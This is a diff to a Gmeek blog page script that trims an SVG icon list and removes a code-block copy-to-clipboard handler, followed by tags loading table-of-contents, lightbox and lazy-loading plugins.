-var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
 var utterancesLoad=0;
 
 console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
@@ -357,70 +359,7 @@ function iFrameLoading(){
     }
 }
 
-document.addEventListener('DOMContentLoaded', () => {
-    const createClipboardHTML = (codeContent, additionalClasses = '') => `
-        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
-        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
-            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
-                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
-                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
-            </clipboard-copy>
-            <div class="copy-feedback">Copied!</div>
-        </div>
-    `;
 
-    const handleCodeElements = (selector = '') => {
-        document.querySelectorAll(selector).forEach(codeElement => {
-            const codeContent = codeElement.innerHTML;
-            const newStructure = document.createElement('div');
-            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
-            newStructure.innerHTML = createClipboardHTML(codeContent);
-
-            const parentElement = codeElement.parentElement;
-            if (selector.includes('highlight')) {
-                parentElement.insertBefore(newStructure, codeElement.nextSibling);
-                parentElement.removeChild(codeElement);
-            } else {
-                parentElement.parentElement.replaceChild(newStructure, parentElement);
-            }
-        });
-    };
-
-    handleCodeElements('pre.notranslate > code.notranslate');
-    handleCodeElements('div.highlight > pre.notranslate');
-
-    let currentFeedback = null;
-    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
-        copyButton.addEventListener('click', () => {
-            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
-            const tempTextArea = document.createElement('textarea');
-            tempTextArea.value = codeContent;
-            document.body.appendChild(tempTextArea);
-            tempTextArea.select();
-            document.execCommand('copy');
-            document.body.removeChild(tempTextArea);
-
-            const copyIcon = copyButton.querySelector('.octicon-copy');
-            const checkIcon = copyButton.querySelector('.octicon-check');
-            const copyFeedback = copyButton.nextElementSibling;
-
-            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
-            currentFeedback = copyFeedback;
-
-            copyIcon.classList.add('d-none');
-            checkIcon.classList.remove('d-none');
-            copyFeedback.style.display = 'block';
-            copyButton.style.borderColor = 'var(--color-success-fg)';
-
-            setTimeout(() => {
-                copyIcon.classList.remove('d-none');
-                checkIcon.classList.add('d-none');
-                copyFeedback.style.display = 'none';
-                copyButton.style.borderColor = '';
-            }, 2000);
-        });
-    });
-});
 
 </script>
 </script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
